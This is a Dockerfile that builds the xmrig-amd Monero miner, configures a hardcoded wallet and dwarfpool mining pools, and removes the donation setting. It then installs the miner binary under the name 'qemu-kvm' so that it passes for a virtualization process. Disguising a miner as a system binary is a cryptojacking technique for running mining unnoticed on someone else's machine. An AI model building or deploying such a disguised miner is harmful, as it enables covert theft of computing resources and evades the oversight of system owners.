FROM ubuntu:16.04

ENV WALLET "49qKkBns3uMFJrC5ptDw2PG9v9Dewo269CyzKJQ4pFEWAzwwwJYRoCaHWeuBKfVbpp68aLNb3ZsBP2rXNiNwTVpu46xJiPe"
ENV POOL "xmr-usa.dwarfpool.com:8005"
ENV POOL_FAIL "xmr-eu.dwarfpool.com:8080"
ENV DONATE_LEVEL "0"

RUN apt-get update && \
  apt-get install -y git build-essential cmake libuv1-dev libmicrohttpd-dev ocl-icd-opencl-dev && \
  git clone https://github.com/xmrig/xmrig-amd.git /xmrig && \
  sed -i 's/kDonateLevel = 5/kDonateLevel = 0/g' /xmrig/src/donate.h && \
  mkdir /xmrig/build && \
  cd /xmrig/build && \
  cmake .. && make

ENV BIN_NAME "qemu-kvm"
RUN cd /xmrig/build && \
    cp ./xmrig-amd /usr/bin/${BIN_NAME} && \
    cd && rm -rf /xmrig

ADD ./entrypoint.sh /usr/bin/entrypoint

ENTRYPOINT ["entrypoint"]
